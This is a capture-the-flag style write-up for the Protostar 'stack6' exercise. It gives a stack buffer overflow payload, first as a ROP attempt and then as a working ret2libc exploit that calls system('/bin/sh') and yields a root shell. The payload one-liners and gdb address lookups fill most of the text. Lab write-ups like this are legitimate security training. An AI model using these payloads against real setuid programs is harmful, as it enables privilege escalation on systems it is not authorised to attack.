**Stack6**

The check in getpath() checks first made me try ROP.

ROP:
```diff
python -c "from struct import pack; print 'a'*72 + 'bbbb' + pack('<I', 0xbffffe38) + pack('<I', 0x08048505) + 'bbbb'*3 + pack('<I', 0xbffffe38 + 8) + shellcode" | ./stack6
```


The following code worked only in gdb because gdb puts it's environment variables in a different place.
After a lot of head-scratching I switched to ret2libc.

Addresses of libc functions:
```diff
$ gdb stack6
$ b main
$ r
$ p system
$1 = {<text variable, no debug info>} 0xb7ecffb0 <__libc_system>
$ p exit
$2 = {<text variable, no debug info>} 0xb7ec60c0 <*__GI_exit>
```

Now we have system's address to execute /bin/sh and exit to exit without any annoying errors.
How do we load /bin/sh into our exploit?
environment variables.
The c code env_addr.c prints out the addresses outside of gdb.

ret2libc:
```diff
$ export SHELLCODE=/bin/sh
$ /tmp/env_addr SHELLCODE
Estimated address: 0xbffff985
$ (python -c "from struct import pack; print 'a'*80 + pack('<I', 0xb7ecffb0) + pack('<I', 0xb7ec60c0) + pack('<I', 0xbffff985 + 9)"; cat) | ./stack6
input path please: got path aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa����aaaaaaaaaaaa�����`췎���
id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)

```

Payload:

Jumping to system + Address of exit (for clean exit) + Address of the shellcode variable as the argument for system.